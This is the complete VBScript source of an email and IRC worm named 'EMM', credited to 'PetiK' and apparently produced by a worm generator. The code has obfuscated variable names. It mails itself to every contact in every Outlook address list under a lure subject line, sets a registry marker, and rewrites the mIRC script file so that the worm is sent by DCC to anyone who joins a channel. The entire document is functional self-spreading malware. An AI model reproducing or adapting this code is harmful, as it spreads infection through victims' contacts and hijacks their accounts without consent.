'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
aroqskuexninpec = WScript.ScriptFullName
Set rrnlrjsvblexiik = CreateObject("WScript.Shell")
Set hipiivrhhmjvnyg = CreateObject("Scripting.FileSystemObject")
If rrnlrjsvblexiik.RegRead("HKCU\Software\EMM_sent") <> "yea" Then
Set deriogwvgnaahvy = CreateObject("Outlook.Application")
If deriogwvgnaahvy <> "" Then
Set eblmtobokmihffw = deriogwvgnaahvy.GetNameSpace("MAPI")
For ibeglnqknrqvtvg = 1 to eblmtobokmihffw.AddressLists.Count
Set vdeyxxpeotgomhf = deriogwvgnaahvy.CreateItem(0)
Set idhxogomwnlggyb = eblmtobokmihffw.AddressLists.Item(ibeglnqknrqvtvg)
vdeyxxpeotgomhf.Attachments.Add aroqskuexninpec
vdeyxxpeotgomhf.Subject = "Hey !!!"
vdeyxxpeotgomhf.Body = "Important message for you !!!"
Set mugdwybdxasoyec = idhxogomwnlggyb.AddressEntries
Set agppeqdkxdnfnfk = vdeyxxpeotgomhf.Recipients
For vqrltsugkwgejbr = 1 to mugdwybdxasoyec.Count
vdeyxxpeotgomhf.Recipients.Add mugdwybdxasoyec.Item(vqrltsugkwgejbr)
Next
vdeyxxpeotgomhf.Send
Next
rrnlrjsvblexiik.RegWrite "HKCU\Software\EMM_sent", "yea"
End If
End If
Set ufsjbctvaftwxbq = hipiivrhhmjvnyg.CreateTextFile("C:\mirc\script.ini", True)
ufsjbctvaftwxbq.WriteLine "[script]"
ufsjbctvaftwxbq.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
ufsjbctvaftwxbq.Write "n1=/dcc  send$nick """
ufsjbctvaftwxbq.Write aroqskuexninpec
ufsjbctvaftwxbq.WriteLine """ }"
ufsjbctvaftwxbq.Close
'Generated with [INDRA] v0.4es.
